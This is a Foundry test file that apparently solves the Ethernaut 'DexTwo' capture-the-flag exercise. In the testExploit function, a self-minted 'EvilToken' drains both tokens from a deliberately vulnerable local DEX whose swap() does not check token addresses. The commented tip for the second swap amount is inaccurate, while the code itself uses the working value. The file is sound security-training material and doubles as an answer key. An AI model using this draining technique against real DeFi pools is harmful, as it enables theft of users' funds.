// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../src/DexTwo.sol";
import {ERC20} from "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

/// @dev Optional malicious token — mint to yourself, seed the Dex, then swap.
///      Fill in or replace with your own ERC20.
contract EvilToken is ERC20 {
    constructor() ERC20("Evil", "EVIL") {
        // ========== YOUR TOKEN SETUP HERE ==========
        // Tip: mint yourself enough supply to seed Dex + swap, e.g.
        //   _mint(msg.sender, 400);
        // ========== END TOKEN SETUP ==========
        _mint(msg.sender, 400);
    }
}

contract DexTwoTest is Test {
    DexTwo public target;
    SwappableTokenTwo public token1;
    SwappableTokenTwo public token2;

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    uint256 constant DEX_LIQUIDITY = 100;
    uint256 constant PLAYER_START = 10;

    function setUp() public {
        // Like the Ethernaut factory:
        //   DexTwo with 100 of each token in the pool, player gets 10 of each.
        vm.startPrank(deployer);

        target = new DexTwo();
        token1 = new SwappableTokenTwo(address(target), "Token 1", "TKN1", DEX_LIQUIDITY + PLAYER_START);
        token2 = new SwappableTokenTwo(address(target), "Token 2", "TKN2", DEX_LIQUIDITY + PLAYER_START);

        target.setTokens(address(token1), address(token2));

        token1.approve(address(target), DEX_LIQUIDITY);
        token2.approve(address(target), DEX_LIQUIDITY);
        target.add_liquidity(address(token1), DEX_LIQUIDITY);
        target.add_liquidity(address(token2), DEX_LIQUIDITY);

        token1.transfer(attacker, PLAYER_START);
        token2.transfer(attacker, PLAYER_START);

        vm.stopPrank();
    }

    function testExploit() public {
        // Win condition (Ethernaut DexTwo):
        //   Drain ALL of BOTH tokens from the Dex
        //   → balanceOf(token1, dex) == 0 AND balanceOf(token2, dex) == 0
        //
        // Difference from Dex:
        //   - swap() does NOT check that from/to are token1/token2
        //   - You can swap ANY ERC20 the Dex holds a balance of
        //
        // Attack outline:
        //   1. Deploy your own ERC20 (EvilToken)
        //   2. Transfer some evil tokens TO the Dex (so getSwapAmount has a from-balance)
        //   3. Approve Dex to pull your evil tokens
        //   4. swap(evil, token1, amount)  — drain all token1
        //   5. swap(evil, token2, amount)  — drain all token2
        //
        // Price math (same as Dex):
        //   amount_out = amount_in * balance(to) / balance(from)
        //   If Dex has 100 evil and 100 token1, swapping 100 evil → gets all 100 token1
        //
        // Tip:
        //   EvilToken evil = new EvilToken();
        //   evil.transfer(address(target), 100);
        //   evil.approve(address(target), type(uint256).max);
        //   target.swap(address(evil), address(token1), 100);
        //   target.swap(address(evil), address(token2), 100);
        //
        // Note: DexTwo.approve() only sets allowance on token1/token2.
        //       For your evil token, call evil.approve(...) yourself.

        vm.startPrank(attacker);

        // ========== YOUR EXPLOIT HERE ==========
        EvilToken evil = new EvilToken();
        evil.transfer(address(target), 100);
        evil.approve(address(target), type(uint256).max);
        target.swap(address(evil), address(token1), 100);
        target.swap(address(evil), address(token2), 200);
        // ========== END EXPLOIT ==========

        vm.stopPrank();

        assertEq(target.balanceOf(address(token1), address(target)), 0, "token1 should be drained");
        assertEq(target.balanceOf(address(token2), address(target)), 0, "token2 should be drained");
    }
}
